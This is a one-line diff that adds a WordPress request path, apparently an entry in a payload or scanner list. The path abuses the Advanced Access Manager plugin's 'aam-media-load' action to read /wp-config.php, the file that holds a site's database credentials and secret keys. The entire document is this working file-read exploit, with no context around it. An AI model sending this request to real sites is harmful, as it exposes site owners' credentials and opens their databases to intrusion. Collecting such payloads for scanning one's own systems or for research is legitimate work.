@@ -1,0 +1,1 @@
+/wp-admin/admin-ajax.php?action=aam-media-load&aam-media=/wp-config.php
